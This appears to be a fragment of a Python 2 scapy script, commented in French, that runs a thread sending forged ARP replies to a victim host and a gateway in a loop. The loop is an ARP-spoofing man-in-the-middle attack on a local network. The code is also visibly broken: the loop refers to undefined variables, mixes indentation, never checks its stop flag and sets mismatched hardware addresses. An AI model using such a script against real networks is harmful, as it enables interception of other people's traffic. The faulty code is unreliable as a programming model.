#!/usr/bin/python
from scapy.all import *
import argparse
import signal
import sys
import logging
import time
import threading
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class sniffer(threading.Thread):
	def __init__(self, IpVictim, MacVictim, IpGw, MacGw): 
		threading.Thread.__init__(self)
		self.Terminated = False 
		self.IpVictim = IpVictim
		self.MacVictim = MacVictim
		self.IpGw = IpGw
		self.MacGw = MacGw	

	def run(self):
		print "IPVictim : "+self.IpVictim
		print "MacVictim : "+self.MacVictim
		print "IPGw : "+self.IpGw
		print "MacGw : "+self.MacGw
		while 1:
			send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=routerMAC))
	    	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=victimMAC))
			time.sleep(1.5)
		print "Le thread sniff s'est bien termine"
    
	#fonction permettant d'arreter la boucle du thread
	def stop(self): 
		self.Terminated = True







